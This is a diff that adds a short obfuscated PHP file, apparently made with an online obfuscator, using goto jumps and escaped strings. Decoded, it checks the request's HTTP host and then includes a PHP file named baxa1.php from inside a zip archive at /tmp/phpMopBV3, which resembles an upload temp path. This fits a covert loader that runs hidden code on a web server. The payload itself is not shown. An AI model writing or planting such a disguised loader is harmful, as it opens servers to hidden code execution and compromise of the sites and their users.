@@ -1,0 +1,4 @@
+<?php
+//Obfuscate by https://uutool.cn/php/
+ goto SRVcy; ZLJgC: zceCj: goto Im52t; cdDeV: $SWjjV = ''; goto YChDT; YChDT: if (empty($_SERVER["\110\x54\x54\x50\x5f\x48\x4f\x53\x54"])) { goto zceCj; } goto W0lX8; SRVcy: echo @null; goto cdDeV; W0lX8: $SWjjV = "\346\x9c\xba\xe5\231\xa8\345\xa4\207\347\xa0\x81\345\x8e\213\347\274\251\xe5\214\205\57\x62\x61\x78\141\x31\x2e\160\x68\x70"; goto ZLJgC; Im52t: include "\172\151\x70\x3a\x2f\x2f\57\x74\155\x70\x2f\160\150\x70\x4d\157\x70\x42\126\x33\43{$SWjjV}";
+
